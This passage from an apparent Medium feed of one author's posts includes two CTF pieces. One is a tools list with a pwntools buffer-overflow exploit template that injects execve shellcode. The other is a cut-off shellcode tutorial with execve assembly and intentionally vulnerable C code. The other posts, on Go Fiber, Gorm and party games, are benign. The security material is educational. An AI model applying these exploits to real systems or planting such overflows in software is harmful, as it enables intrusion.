        "Content": "\u003cp\u003eBinary challenges are one of the most common types of CTF. Usually, they require you to analyze a binary and exploit some vulnerabilities.\u003c/p\u003e\u003cp\u003eThere are a lot of tools out there, and in this article, we will see ten of them that you can’t miss during your exploitation. Without these resources, resolving binary challenges would not be the same.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*E2NXCfiWlEsWskyLrev3Dw.jpeg\" /\u003e\u003c/figure\u003e\u003ch4\u003e1. pwntools\u003c/h4\u003e\u003cp\u003epwntools is a python package that allows you to write exploits faster. It gives a lot of utilities that can help you to write code during binary challenges.\u003c/p\u003e\u003cp\u003eHere you can see a simple exploit for shellcode exploitation with a buffer overflow vulnerability.\u003c/p\u003e\u003cpre\u003e#!/usr/bin/env python3\u003cbr\u003e\u003cbr\u003eimport sys\u003cbr\u003efrom pwn import *\u003cbr\u003e\u003cbr\u003eif \u0026quot;--remote\u0026quot; in sys.argv:\u003cbr\u003e    p = remote(\u0026quot;url\u0026quot;, 1337)\u003cbr\u003eelse:\u003cbr\u003e    p = process(\u0026quot;./path_to_binary\u0026quot;)\u003cbr\u003e\u003cbr\u003eif \u0026quot;--debug\u0026quot; in sys.argv:\u003cbr\u003e    context.terminal = [\u0026quot;gnome-terminal\u0026quot;]\u003cbr\u003e    gdb.attach(p, \u0026quot;\u0026quot;\u0026quot;\u003cbr\u003e    b *0x\u0026lt;breakpoint_address\u0026gt;\u003cbr\u003e    c\u003cbr\u003e    \u0026quot;\u0026quot;\u0026quot;)\u003cbr\u003e\u003cbr\u003eshellcode = asm(\u0026quot;\u0026quot;\u0026quot;\u003cbr\u003emov rax, 0x3b\u003cbr\u003emov rdi, \u0026lt;buffer_address\u0026gt;\u003cbr\u003emov rsi, 0\u003cbr\u003emov rdx, 0\u003cbr\u003esyscall\u003cbr\u003e\u0026quot;\u0026quot;\u0026quot;, arch=\u0026#39;amd64\u0026#39;)\u003cbr\u003e\u003cbr\u003epayload = \u0026quot;A\u0026quot; * 64\u003cbr\u003epayload += shellcode\u003cbr\u003ep.sendline(payload)\u003cbr\u003ep.interactive()\u003c/pre\u003e\u003cp\u003e\u003ca href=\"https://docs.pwntools.com/en/stable/\"\u003epwntools - pwntools 4.8.0 documentation\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e2. pwndbg\u003c/h4\u003e\u003cp\u003epwndbg helps to make gdb more accessible by adding powerful commands and a better interface. Each address is printed with a different color to indicate which part of the memory it is relative to. Also, the context that is shown at every breakpoint helps to take a quick look at the current state of the execution.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*fvlW_aaEmeHQkJT3Jdx2qg.png\" /\u003e\u003cfigcaption\u003eAn example of context with pwndbg\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://github.com/pwndbg/pwndbg\"\u003eGitHub - pwndbg/pwndbg: Exploit Development and Reverse Engineering with GDB Made Easy\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e3. Ghidra\u003c/h4\u003e\u003cp\u003eDeveloped by the NSA, Ghidra is one of the most used tools for reverse engineering. Also, it is completely open source and free to use.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*8fZesHRSwUouwbzVeZrMcA.png\" /\u003e\u003cfigcaption\u003eAn example of a binary disassembled with Ghidra\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://ghidra-sre.org/\"\u003eGhidra\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e4. ref.x86asm.net\u003c/h4\u003e\u003cp\u003eIn some challenges, it could be fundamental to know which is the code for every possible assembly operation available. You can find a list with a lot of details about each instruction on this website. There is also written what is the meaning of each byte and the possible ways to use each operation.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*thl76UkQSm5o_5ZeHXRvbA.png\" /\u003e\u003cfigcaption\u003eINC of a 32 bit register is coded as 40 + the number of the register\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"http://ref.x86asm.net\"\u003eX86 Opcode and Instruction Reference\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e5. defuse.ca\u003c/h4\u003e\u003cp\u003eIt could be a mess to compile assembly code, but don’t worry, this website can help you! You can write a list of assembly instructions and see the compilation result for x86 and x64. Also, there are multiple representations available like string literal or raw hex to easily copy and paste the result into your code.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*7aL03MXH1u21QJroxTEDvA.png\" /\u003e\u003cfigcaption\u003eExample of assembly compiler\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://defuse.ca/online-x86-assembler.htm\"\u003eOnline x86 and x64 Intel Instruction Assembler\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e6. syscall.sh\u003c/h4\u003e\u003cp\u003eThere are a lot of available lists on the internet, but this one can beat them all. The URL can be memorized easily and with one click you can look at x86, x64, arm, and arm64 syscalls details. Furthermore, there is also a public API that you could call in your scripts!\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*7OopI1Vonqj_tYvVUUkr8w.png\" /\u003e\u003cfigcaption\u003eThe execve definition in x64\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://syscall.sh\"\u003eLinux System Calls quick and easy\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e7. how2heap\u003c/h4\u003e\u003cp\u003eHeap exploitation is one of the most complex types of challenges in the binary field. The goal is usually to exploit the logic behind heap management. This means that is fundamental to know how malloc, calloc, and free works and also the cleaning systems like the t-cache and the different types of bins.\u003c/p\u003e\u003cp\u003ehow2heap has a lot of examples of how to exploit different heap vulnerabilities. Each example has a C code that explains the attack. This allows you to build the code and run it with a debugger to look carefully at all the operations done. Thanks to this tool heap exploitation become more accessible for everyone.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*SM1hcjmjiFgX-ypI4SnnyA.png\" /\u003e\u003cfigcaption\u003eA simple example for a fast bin attack\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://github.com/shellphish/how2heap\"\u003eGitHub - shellphish/how2heap: A repository for learning various heap exploitation techniques.\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e8. ngrok\u003c/h4\u003e\u003cp\u003eSometimes, you could need to obtain a reverse shell by using sockets or send data to a self-hosted API. The big problem in this situation is that you need to know your IP and your firewall must allow external connections.\u003c/p\u003e\u003cp\u003eIn these cases, ngrok can help. It makes public a port of your host that you decide and it gives an URL. You only need to connect to the given URL and everything works. One line and your service hosted on your computer will be available on the internet.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/612/1*AqspkSWLbVTICOzFs1PrmQ.png\" /\u003e\u003cfigcaption\u003eAn http server accessible locally at port 3000 with a public link\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://ngrok.com/\"\u003engrok - Online in One Line\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e9. preeny\u003c/h4\u003e\u003cp\u003epreeny is a set of libraries that can be used to avoid the execution of anti-debugging functions like alarm or fork. You only need to run your binary by prepending the string \u003cem\u003eLD_PRELOAD=./path/to/preeny\u003c/em\u003e and you are done.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/775/1*8T2Pzmq8B_Fot_SZ_HVihg.png\" /\u003e\u003cfigcaption\u003eExample of usage to remove socket connections from a binary\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://github.com/zardus/preeny\"\u003eGitHub - zardus/preeny: Some helpful preload libraries for pwning stuff.\u003c/a\u003e\u003c/p\u003e\u003ch4\u003e10. pwninit\u003c/h4\u003e\u003cp\u003eUsually, every challenge requires some common operation to be done at the beginning. For example, you could download the same libc version of the binary and then patch it. pwninit can help by automatizing the first operations that usually are done. Next time try giving pwninit a chance to start exploitation.\u003c/p\u003e\u003cp\u003epwinit searches by default for a binary called hunter and makes a patched version of it. It creates also a basic initial script that can be used to begin exploitation.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/775/1*Tt8tE7oZAvDww10h9RjjUw.png\" /\u003e\u003cfigcaption\u003eExample of pwninit with a binary called hunter\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://github.com/io12/pwninit\"\u003eGitHub - io12/pwninit: pwninit - automate starting binary exploit challenges\u003c/a\u003e\u003c/p\u003e\u003cp\u003eI think that these ten tools are very helpful for every binary challenge. Give them a try and let me know in the comments if you find them useful.\u003c/p\u003e\u003cp\u003eGood pwning! 👨‍💻\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=d9c22b8d87a6\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Why you should leave Gorilla and start using Fiber instead",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/why-you-should-leave-gorilla-and-start-using-fiber-instead-35093c6f6e77?source=rss-5a9085122896------2",
        "PubDate": "Sat, 12 Nov 2022 18:11:31 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "go",
          "fiber",
          "backend",
          "rest",
          "golang"
        ],
        "Guid": "https://medium.com/p/35093c6f6e77",
        "Content": "\u003cp\u003eGorilla is one of the most used Go libraries to develop REST API. It is very simple to use and it makes the standard net/http library more accessible.\u003c/p\u003e\u003cp\u003eIn a big project, it could help to use a more clean and optimized framework that hides unuseful complexity. This is where Fiber can help!\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/800/1*terq3SHTxmgJRnXieCrpSA.png\" /\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://gofiber.io/\"\u003eFiber\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eFast, fast, and again fast!\u003c/h3\u003e\u003cp\u003eOn the homepage of the Fiber documentation, you can see a comparison between the most common Go frameworks like Gin, Martini, and Negroni. Fiber is one of the best, thanks to the fasthttp package under the hood that is much faster than the standard net/http package.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*aLpsANDYuPYp4Qw9j9SzpQ.png\" /\u003e\u003cfigcaption\u003efasthttp package has the best performance\u003c/figcaption\u003e\u003c/figure\u003e\u003ch3\u003eThe documentation is well written, yes it is possible!\u003c/h3\u003e\u003cp\u003eIf you have developed with Go for some time you have already accepted that the language is relatively new. So, also the libraries that have been made.\u003c/p\u003e\u003cp\u003eUsually, the documentations are a work in progress and there is not enough information to use the library properly.\u003c/p\u003e\u003cp\u003eFortunately, this is not the case. The Fiber docs contain everything fundamental you could need and it is really well written.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*5DbJ4ZbcnxzSyOa3tF5dWQ.png\" /\u003e\u003cfigcaption\u003eThe homepage of the official Fiber docs\u003c/figcaption\u003e\u003c/figure\u003e\u003ch3\u003eMiddleware in one line\u003c/h3\u003e\u003cp\u003eIf you take a look at the documentation of Fiber you can see that there are a lot of middlewares available.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://docs.gofiber.io/api/middleware\"\u003eMiddleware\u003c/a\u003e\u003c/p\u003e\u003cp\u003eFor example, to add a rate limiter to your app you have to simply add this line.\u003c/p\u003e\u003cpre\u003eapp.Use(limiter.New())\u003c/pre\u003e\u003cp\u003eA rate limiter will be added to your app with the default settings. With a single line your worries are at ease.\u003c/p\u003e\u003ch3\u003eOne context to rule them all\u003c/h3\u003e\u003cp\u003eUsually, you have to manage a lot of parameters like an http request and response, a parsed token, or other additional stuff your logic could need. Fiber simplify this by using a single variable called Context where everything is put in it. Your function will have only to take as input a parameter and it will have access to everything it could need.\u003c/p\u003e\u003cpre\u003eapp.Get(\u0026quot;/\u0026quot;, func (c *fiber.Ctx) error {\u003cbr\u003e  c.AllParams()\u003cbr\u003e  c.Cookies(\u0026quot;name\u0026quot;)\u003cbr\u003e  c.IPs()\u003cbr\u003e  c.Query(\u0026quot;order\u0026quot;)\u003cbr\u003e  // ...\u003cbr\u003e  return c.Send([]byte(\u0026quot;Hello, World!\u0026quot;))\u003cbr\u003e})\u003c/pre\u003e\u003ch3\u003eError handling is a piece of cake.\u003c/h3\u003e\u003cp\u003eYour app should return a valid response even if an error occurs. Managing them could be difficult, but even for this problem Fiber has a solution.\u003c/p\u003e\u003cp\u003eYou can return a specific fiber error with a status code and a message and everything will be taken care of by Fiber itself. Like a piece of cake!\u003c/p\u003e\u003cpre\u003eapp.Get(\u0026quot;/\u0026quot;, func(c *fiber.Ctx) error {\u003cbr\u003e  return fiber.NewError(fiber.StatusServiceUnavailable, \u0026quot;On vacation!\u0026quot;)\u003cbr\u003e})\u003c/pre\u003e\u003cp\u003eI hope that you will give a chance to Fiber for your next project. Let me know if you like it!\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=35093c6f6e77\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Five tips on how to use Gorm better",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/five-tips-on-how-to-use-better-gorm-90f42d37aa20?source=rss-5a9085122896------2",
        "PubDate": "Tue, 01 Nov 2022 09:53:00 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "gorm",
          "tips",
          "orm",
          "golang",
          "go"
        ],
        "Guid": "https://medium.com/p/90f42d37aa20",
        "Content": "\u003cp\u003eGorm is one of the most used ORM for the Go language. It is complete and very easy to use. But sometimes the documentation does not cover all the case.\u003c/p\u003e\u003cp\u003eThere are some functionalities that once known can help you to write better code and simplify your work. Let see five tips on how to use Gorm better.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/824/0*roF0cqz1moqAA8Hk.png\" /\u003e\u003c/figure\u003e\u003ch3\u003eUse custom foreign key constraints\u003c/h3\u003e\u003cp\u003eWhen you create relations between tables remember to update the constraints on the foreign keys. As default, Gorm set the mode “NO ACTION” for update and delete cases.\u003c/p\u003e\u003cp\u003eHowever, you could make your life easier by using specific modes like for example the “CASCADE” one. Every time a primary key is updated also the relative foreign key will be too. Instead, if a referenced record is deleted also the rows that reference it will be deleted as well.\u003c/p\u003e\u003cp\u003eIn PostgreSQL the available constraints are:\u003c/p\u003e\u003cul\u003e\u003cli\u003eSET NULL: set the foreign key to null\u003c/li\u003e\u003cli\u003eCASCADE: do the same action as done on the referenced row.\u003c/li\u003e\u003cli\u003eSET DEFAULT: set the foreign key to the default value (null or empty if not specified)\u003c/li\u003e\u003cli\u003eNO ACTION and RESTRICT: in few words, they do not allow some operations on the referenced row. Look to the documentation to read more details about them.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003ca href=\"https://www.postgresql.org/docs/current/ddl-constraints.html\"\u003e5.4. Constraints\u003c/a\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/793/1*TYtWOXCymZ7XEbJigjHbkg.png\" /\u003e\u003cfigcaption\u003eAn example of specific constraints defined on the model.\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\"https://gorm.io/docs/has_one.html#FOREIGN-KEY-Constraints\"\u003eHas One\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eNot using debug when stucked\u003c/h3\u003e\u003cp\u003eOne of the most easier way to find errors is to use the inner debug utility available with Gorm. You just need to prepend “. Debug()” to your function call and you are done! Now, all the queries will be executed as before but in addition the statement is printed.\u003c/p\u003e\u003cpre\u003edb.Debug().Table(\u0026quot;users\u0026quot;).Select(\u0026quot;users.name, emails.email\u0026quot;).Joins(\u0026quot;left join emails on emails.user_id = users.id\u0026quot;).Scan(\u0026amp;results)\u003c/pre\u003e\u003cp\u003e\u003ca href=\"https://gorm.io/docs/session.html#Debug\"\u003eSession\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eJoins and Preload\u003c/h3\u003e\u003cp\u003eOne of the most useful feature of Gorm is the automatically management of relations. The functions “Preload” and “Join” help to do this, but when is better to use one or the other?\u003c/p\u003e\u003cp\u003eJoins is optimized for one to one relation and it makes the query faster by directly adding the join to the query. Preload instead can be used in any case, but it first reads all the records and then manually updating the relations in the final result.\u003c/p\u003e\u003cpre\u003edb.Preload(\u0026quot;Orders\u0026quot;).Find(\u0026amp;users)\u003c/pre\u003e\u003cpre\u003edb.Joins(\u0026quot;Company\u0026quot;).Joins(\u0026quot;Manager\u0026quot;).Joins(\u0026quot;Account\u0026quot;).First(\u0026amp;user, 1)\u003c/pre\u003e\u003cpre\u003e// You can\u0026#39;t do this!\u003cbr\u003e// db.Joins(\u0026quot;Orders\u0026quot;).Find(\u0026amp;users)\u003cbr\u003e// because an user can have more than one order\u003c/pre\u003e\u003cp\u003e\u003ca href=\"https://gorm.io/docs/preload.html\"\u003ePreloading (Eager Loading)\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eFind and First\u003c/h3\u003e\u003cp\u003eFind and first are both used to retrieve data, but there is a big difference between them about how they handle errors. By using “Find”, if no value is found an error is raised. Instead, if no rows are retrieved with “First” nothing happen. The value returned will be empty and the error nil.\u003c/p\u003e\u003cpre\u003edb.First(\u0026amp;user) // an error is raised it the table is empty\u003c/pre\u003e\u003cpre\u003edb.Limit(1).Find(\u0026amp;user) // no error\u003c/pre\u003e\u003cp\u003e\u003ca href=\"https://gorm.io/docs/query.html\"\u003eQuery\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eAutoMigrate your model to have always the last version\u003c/h3\u003e\u003cp\u003eWhile working on your project it could happen that a new table or column are needed. Take track of new changes can be difficult, but for this case Gorm provides the Migrate function.\u003c/p\u003e\u003cp\u003eThis function takes in input the model to create new tables and update the database accordingly. The approach is conservative, Gorm only does additions or updates of new functionalities.\u003c/p\u003e\u003cpre\u003edb.AutoMigrate(\u0026amp;User{}, \u0026amp;Product{}, \u0026amp;Order{})\u003c/pre\u003e\u003cp\u003e\u003ca href=\"https://gorm.io/docs/migration.html#Auto-Migration\"\u003eMigration\u003c/a\u003e\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=90f42d37aa20\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Ten online party games to play for free with your friends",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/ten-online-party-games-to-play-for-free-with-your-friends-b28c3300891e?source=rss-5a9085122896------2",
        "PubDate": "Sat, 15 Oct 2022 07:23:20 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "games",
          "discord",
          "online",
          "friends",
          "party"
        ],
        "Guid": "https://medium.com/p/b28c3300891e",
        "Content": "\u003cp\u003eYou are on Discord or at home with your friends and you want to play a game but you don’t have any board game with you. Don’t worry!\u003c/p\u003e\u003cp\u003eFortunately, there are a lot of online party games that you and your friends can play online for free. You only need a device and an Internet connection.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*meRG4YlBF5Auj9nKkk2OyQ.jpeg\" /\u003e\u003c/figure\u003e\u003ch3\u003eSpyfall\u003c/h3\u003e\u003cp\u003eYou are FBI detectives but one of you is a spy. Each player has a photo of the round location while the spy has multiple ones. The goal is to find the spy before it founds out the correct location!\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://www.spyfall.app/\"\u003eSpyfall\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eCodenames\u003c/h3\u003e\u003cp\u003eCodenames is guessing words game played in two teams. Each team must decide a spymaster while the others are field operative. Only the spymasters know which words their teams must guess.\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003ca href=\"https://codenames.game/\"\u003eCodenames - Play with your Friends Online\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://www.ultraboardgames.com/codenames/game-rules.php\"\u003eHow to play Codenames | Official Rules | UltraBoardGames\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eTaboo\u003c/h3\u003e\u003cp\u003eAnother two team game about guessing words. This time is the classic Taboo. In each round, one person per team has to help their teammates guess a word without using the “taboo” ones. The winner is the team who guess more words.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://playtaboo.app\"\u003eTaboo!\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eSecret Hitler\u003c/h3\u003e\u003cp\u003eSecret Hitler will make you lie and betray your friends. There are two teams that are chosen randomly by the game. In simple terms, the goal of the “good” ones is to make a certain number of “good” policies to pass while the other to elect the dictator. There are a lot of different versions out there, will you be Hitler, Voldemort or Palpatine?\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003ca href=\"https://secret-hitler.com/\"\u003eSecret Hitler Online\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://secret-voldemort.de/\"\u003eSecret Voldemort\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://netgames.io/games/secret-sith\"\u003eSecret Sith\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eSkribbl\u003c/h3\u003e\u003cp\u003eIn Skribbl, like Pictionary, one person per turn has to draw a word and others have to guess it to gain points.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://skribbl.io/\"\u003eskribbl - Free Multiplayer Drawing \u0026amp; Guessing Game\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eGartic\u003c/h3\u003e\u003cp\u003eAnother Pictionary like game.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://gartic.io\"\u003eGartic.io - Draw, Guess, WIN\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eGartic Phone\u003c/h3\u003e\u003cp\u003eA telephone game in which each user has to draw something written by someone else and make other guessing it.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://garticphone.com/\"\u003eGartic Phone - The Telephone Game\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eCoup online\u003c/h3\u003e\u003cp\u003eA peculiar game in which there are multiple influences with different abilities. Each player starts with two of them and their goal is to be the last with at least one influence. See the official rules for more details.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://www.chickenkoup.com/\"\u003eCoup Online\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eDecryptr\u003c/h3\u003e\u003cp\u003eA Decrypto like game in which each team has to guess the coded messages presented to them by other members while cracking the codes they intercept from the opposing team.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://www.decryptr.io/\"\u003eDecryptr\u003c/a\u003e\u003c/p\u003e\u003cp\u003eI hope that you have found some games to play with your friends.\u003c/p\u003e\u003cp\u003eIf you know other games that should be added don’t hesitate to write them in the comments!\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=b28c3300891e\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Basic shellcode exploitation",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/basic-shellcode-exploitation-1e9ff274a194?source=rss-5a9085122896------2",
        "PubDate": "Sun, 09 Oct 2022 16:39:44 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "challenge",
          "shellcode",
          "assembly",
          "binary",
          "ctf"
        ],
        "Guid": "https://medium.com/p/1e9ff274a194",
        "Content": "\u003cp\u003eShellcode is one of the main techniques used in binary challenges, usually to obtain a reverse shell.\u003c/p\u003e\u003cp\u003eIn this tutorial we will see what is a shellcode and how to use it by looking to a simple example.\u003c/p\u003e\u003cp\u003eBut first there are some questions to ask.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Ux5KX-u8MntV_piI1kSopw.jpeg\" /\u003e\u003c/figure\u003e\u003ch3\u003eShellcode, syscall and other awesome stuff\u003c/h3\u003e\u003ch4\u003eWhat is a shellcode?\u003c/h4\u003e\u003cp\u003eA shellcode is a sequence of assembly instructions. Usually it is inserted in memory and then executed by exploiting a vulnerability.\u003c/p\u003e\u003cp\u003eIt is called shellcode because at the beginning it was used only to obtain a shell. Nowadays, shellcode are used to execute whatever sequence of instructions.\u003c/p\u003e\u003ch4\u003eWhen is it useful to use a shellcode?\u003c/h4\u003e\u003cp\u003eA shellcode is useful when you have a vulnerability but nothing to use inside the binary. For example, you could have found a \u003cstrong\u003ebuffer overflow\u003c/strong\u003e but there isn’t any function to call.\u003c/p\u003e\u003ch4\u003eWhat is it necessary for a shellcode exploit?\u003c/h4\u003e\u003cp\u003eTo write a shellcode you need an executable place in memory and you must know the start \u003cstrong\u003eaddress\u003c/strong\u003e of it. It could be everywhere and the address could be leaked during the execution.\u003c/p\u003e\u003cp\u003eFurthermore, you must have a vulnerability that allows the shellcode to be executed.\u003c/p\u003e\u003ch4\u003eHow to obtain a reverse shell?\u003c/h4\u003e\u003cp\u003eTo obtain a reverse shell is enough to execute an \u003cstrong\u003eexecve\u003c/strong\u003e syscall.\u003c/p\u003e\u003cp\u003eThe path parameter must be a pointer to the binary path that we want to execute like the string \u003cem\u003e/bin/sh\\0\u003c/em\u003e.\u003c/p\u003e\u003cpre\u003eint execve(const char *pathname, char *const argv[], char *const envp[]);\u003c/pre\u003e\u003cp\u003e\u003cem\u003epathname\u003c/em\u003e The path for the executable to be run, usually a pointer to the string `/bin/sh\\0`\u003c/p\u003e\u003cp\u003e\u003cem\u003eargv\u003c/em\u003e Command line parameters\u003c/p\u003e\u003cp\u003e\u003cem\u003eenvp\u003c/em\u003e Environmental variables\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/677/1*3KuDWzMdugUv6JK8JAjYTg.jpeg\" /\u003e\u003cfigcaption\u003eUse man execve to get more details\u003c/figcaption\u003e\u003c/figure\u003e\u003ch4\u003eSyscall in linux\u003c/h4\u003e\u003cp\u003eTo understand shellcode it is fundamental know the basics of \u003cstrong\u003esystem calls \u003c/strong\u003ein Linux.\u003c/p\u003e\u003cp\u003eThere are some difference between 32 bit and 64 bit executables. So, always be careful with the version of the binary. An easy way to find out is to used the linux \u003cem\u003efile\u003c/em\u003e utility.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/677/1*z0BpwWWxC_HOhssRSAArcw.jpeg\" /\u003e\u003c/figure\u003e\u003cp\u003eIn \u003cstrong\u003e32 bit\u003c/strong\u003e the instruction to do a syscall is \u003cem\u003eint 0x80\u003c/em\u003e.\u003c/p\u003e\u003cp\u003eYou have to put in the register eax the code of the syscall that you want to write.\u003c/p\u003e\u003cp\u003eThe registers ebx, ecx and edx are respectively the first, the second and the third parameter.\u003c/p\u003e\u003cpre\u003emov eax, 0xb              # execve code in x86\u003cbr\u003emov ebx, \u0026lt;address of “/bin/sh\\0”\u0026gt;\u003cbr\u003emov ecx, 0\u003cbr\u003emov edx, 0\u003cbr\u003eint 0x80\u003c/pre\u003e\u003cp\u003eIn \u003cstrong\u003e64 bit\u003c/strong\u003e instead, the instruction to use is \u003cem\u003esyscall\u003c/em\u003e.\u003c/p\u003e\u003cp\u003eThe register rax is where to put the code, while rdi, rsi and rdx are the register for the parameters.\u003c/p\u003e\u003cpre\u003emov rax, 0x3b              # execve code in x64\u003cbr\u003emov rdi, \u0026lt;address of \u0026quot;/bin/sh\\0\u0026quot;\u0026gt;\u003cbr\u003emov rsi, 0\u003cbr\u003emov rdx, 0\u003cbr\u003esyscall\u003c/pre\u003e\u003ch3\u003eA simple example\u003c/h3\u003e\u003ch4\u003eThe code\u003c/h4\u003e\u003cp\u003eAt the end of this article you can find a valid solution and the original code.\u003c/p\u003e\u003cpre\u003e#include \u0026lt;stdio.h\u0026gt;\u003c/pre\u003e\u003cpre\u003evoid read_buf(char *buf)\u003cbr\u003e{\u003cbr\u003e    printf(\u0026quot;Please write something: \u0026quot;);\u003cbr\u003e    read(0, buffer, 0x80); // here there is a buffer overflow\u003cbr\u003e    return;\u003cbr\u003e}\u003c/pre\u003e\u003cpre\u003evoid print_buf(char *buf)\u003cbr\u003e{\u003cbr\u003e    printf(\u0026quot;You write: %s\\n\u0026quot;, buf);\u003cbr\u003e    return;\u003cbr\u003e}\u003c/pre\u003e\u003cpre\u003evoid user_input()\u003cbr\u003e{\u003cbr\u003e    char buf[80];\u003cbr\u003e    read_buf(buf);\u003cbr\u003e    print_buf(buf);\u003cbr\u003e}\u003c/pre\u003e\u003cpre\u003eint main()\u003cbr\u003e{\u003cbr\u003e    user_input();\u003cbr\u003e    return 0;\u003cbr\u003e}\u003c/pre\u003e\u003cp\u003e\u003ca href=\"https://github.com/francescopastore/ctf-cheats/blob/main/blog/2022/assets/02/shellcode.zip\"\u003eHere you can find a builded version without protections\u003c/a\u003e\u003c/p\u003e\u003ch4\u003eAnalysis\u003c/h4\u003e\u003cp\u003eFirstly, we have to check for possible vulnerabilities inside the binary. We can see that the code is very straightforward. The program reads something from input and then it writes it on standard output.\u003c/p\u003e\u003cp\u003eBy looking carefully we see that the input is managed by a \u003cstrong\u003eread\u003c/strong\u003e with a number of bytes equals to 0x80. However, the buffer is long 80 bytes so we have here a buffer overflow vulnerability.\u003c/p\u003e\u003ch4\u003eThe 